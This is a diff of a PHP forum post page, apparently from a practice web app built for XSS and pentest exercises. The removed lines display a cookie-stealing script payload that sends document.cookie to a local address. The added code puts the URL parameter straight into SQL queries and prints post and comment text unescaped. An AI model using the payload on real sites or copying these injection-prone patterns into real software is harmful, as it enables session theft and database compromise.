@@ -1,3 +1,14 @@
+<?php
+include "conn.php";
+
+$IDPost = $_GET['IDPost'];
+$sqlTopic = "SELECT * from post WHERE (ID=$IDPost)";
+$resultTopic = $conn->query($sqlTopic);
+$rowTopic = mysqli_fetch_array($resultTopic);
+
+
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -10,6 +21,9 @@
 </head>
 
 <style>
+    a {
+        color: inherit;
+    }
     #other-box {
         background-color: #222244;
     }
@@ -59,6 +73,9 @@
         background-color: #2C2A49;
         color: white;
     }
+    .white {
+        color:white;
+    }
 </style>
 
 <body>
@@ -70,7 +87,7 @@
                 <?php 
                 session_start();
                 if(isset($_SESSION['username']) != null){
-                    echo "MyProfile";
+                    echo "<a href=profile.php>$_SESSION[username]</a>";
                 }else{
                     echo "Login";
                 }?>
@@ -84,23 +101,19 @@
                 <tbody>
                     <tr>
                         <th>
-                            <h2 style="color: yellow">How to xss</h2>
+                            <h2 style="color: yellow"><?php echo $rowTopic['Title'] ?></h2>
                         </th>
                     </tr>
                     <tr>
-                        <td><span class="border border-primary">xss</span> &nbsp; <span class="border border-primary">attack</span> &nbsp; <span class="border border-primary">pentest</span></td>
+                        <td><span class="border border-primary white">xss</span> &nbsp; <span class="border border-primary white">attack</span> &nbsp; <span class="border border-primary white">pentest</span></td>
 
 
                     </tr>
 
                     <tr>
                         <td>
-                            <p>
-                                <?php $xss = "<script>document.write('<img src=http://127.0.0.1/xss-params?cookie='         + escape(document.cookie) + '>'); </script>     <script>document.write('<img src=https://www.science.kmitl.ac.th/department_com/department_img/pictureProfile/01.jpg>'); </script>";
-                                    $xss = htmlspecialchars($xss);
-                                    echo "copy these script to comment if you want to make error: <br>";
-                                    echo $xss . "<br>";
-                                ?>
+                            <p style="color: white">
+                               <?php echo $rowTopic['About'] ?>
                             </p>
                         </td>
                     </tr>
@@ -108,7 +121,7 @@
 
                     <tr>
                         <td class="user-box">
-                            <h3 style="color:#91A8D1">Zergreen - Mon</h3>
+                            <h3 style="color:#91A8D1"><?php echo $rowTopic['IDUser'] ?> - Mon</h3>
                         </td>
                     </tr>
 
@@ -122,55 +135,27 @@
         Total comment 52
         <hr>
 
-        <div class="box" id="other-box" style="color: white">
+        <?php
+        
+        $qComment = "SELECT * FROM comment WHERE IDPost = $IDPost";
+        $resultComment = $conn->query($qComment);
+
+        while($rowComment = mysqli_fetch_array($resultComment)){
+            echo"
+            <div class=box id=other-box style='color: white'>
             <table>
-                <tbody>
-                    <tr>
-                        <th>
-                            <h6 style="color: #7B746F">ความคิดเห็นที่ 1</h6>
-                        </th>
-                    </tr>
-
-                    
-                    <tr>
-                        <td>
-                            <p>wow</p>
-                        </td>
-                    </tr>
-                    
-
-                    <tr>
-                        <td class="user-box">
-                            <h3 style="color:#91A8D1">Zergreen - Mon</h3>
-                        </td>
-                    </tr>
-
-
-                </tbody>
+            <tbody>
+            <tr><th><h6 style='color: #7B746F'>ความคิดเห็นที่ $rowComment[ID]</h6></th></tr>
+            <tr><td><p style='color: white'>$rowComment[comment]</p></td></tr>
+            <tr><th><h3 style='color: #91A8D1'>$rowComment[IDUser]</h3></th></tr>
+            </tbody>
             </table>
-        </div>
+            </div>
+            <br>
+            ";
+        }
+        ?>
 
-        <!-- <hr>
-        Comment
-        <hr>
-
-        <div class="box" id="comment">
-            <center>
-                If you not login you can't comment! <br>
-                <a href="login.html"><input type="button" value="login"></a>
-            </center>
-        </div>
-
-        <hr>
-        Can Comment
-        <hr>
-
-        <div class="box" id="comment">
-            <form action="comment.php" method=post>
-                <input type="text" placeholder="comment" style="width:85%">
-                <input type="submit" value="send">
-            </form>
-        </div> -->
 
         <hr>
         comment
@@ -180,8 +165,10 @@
         if(isset($_SESSION['username']) != null){
             echo "
             <div class='box' id='comment'>
-            <form action='comment.php' method=post>
+            <form action='insertComment.php' method=post>
                 <input name='comment' type='text' placeholder='comment' style='width:85%'>
+                <input type='hidden' name='IDUser' value='$_SESSION[id]'>
+                <input type='hidden' name='IDPost' value='$IDPost'>
                 <input type='submit' value='send'>
             </form>
             </div>
@@ -198,8 +185,37 @@
         }
         ?>
 
+<section class="">
+                <!-- Footer -->
+                <footer class="text-center text-white" style="background-color: #464472;">
+                    <!-- Grid container -->
+                    <div class="container p-4 pb-0">
+                        <!-- Section: CTA -->
+                        <section class="">
+                            <p class="d-flex justify-content-center align-items-center">
+                                <span class="me-3">Register for free</span>
+                                <button type="button" class="btn btn-outline-light btn-rounded">
+                                    Sign up!
+                                </button>
+                            </p>
+                        </section>
+                        <!-- Section: CTA -->
+                    </div>
+                    <!-- Grid container -->
+
+                    <!-- Copyright -->
+                    <div class="text-center p-3" style="background-color: #2C2A49;">
+                        © 2020 Copyright:
+                        <a class="text-white" href="https://mdbootstrap.com/"> powerpuffboy.uk</a>
+                    </div>
+                    <!-- Copyright -->
+                </footer>
+                <!-- Footer -->
+            </section>
+
 
     </div>
+
 </body>
 
 </html>
